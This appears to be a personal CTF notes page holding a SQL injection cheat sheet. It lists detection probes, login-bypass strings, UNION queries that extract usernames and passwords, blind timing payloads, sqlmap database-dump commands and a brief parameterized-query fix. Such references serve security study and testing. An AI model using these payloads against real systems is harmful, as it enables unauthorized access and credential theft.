---
type: reference
category: Payloads
tags: [reference, payloads, web, sqli, injection]
---

# SQL Injection

Standard SQLi cheatsheet. No vault writeup backs this one yet (the related [[No SQLi]] challenge was NoSQL, see [[NoSQL Injection]]); fill in with real cases as they come up.

## Detect
```
'            -> error or changed behavior
"
`
')  ")  `)
1 or 1=1
' OR '1'='1
' AND SLEEP(5)--      time-based blind tell
```

## Auth bypass
```
' OR '1'='1' --
' OR 1=1 --
admin' --
admin' #
' OR '1'='1' /*
```

## UNION-based extraction
```
' ORDER BY 1--        increment until error -> column count
' UNION SELECT NULL--  pad NULLs to match column count
' UNION SELECT 1,2,3--
' UNION SELECT NULL,version(),NULL--
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables--
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT NULL,concat(username,':',password),NULL FROM users--
```

## Blind (boolean / time)
```
' AND 1=1--           true
' AND 1=2--           false
' AND SLEEP(5)--      MySQL time-based
'; WAITFOR DELAY '0:0:5'--   MSSQL
' AND (SELECT 1 FROM users LIMIT 1)=1--
```

## Comment styles
```
--   -- -   #   /* */    (MySQL: --<space> or #)
```

## Tooling
```
sqlmap -u "http://target/?id=1" --batch --dbs
sqlmap -r request.txt --batch --dump
```

## Fix
Parameterized queries / prepared statements. Never concatenate user input into SQL.

## Related
- [[Web App Methodology]], [[NoSQL Injection]]
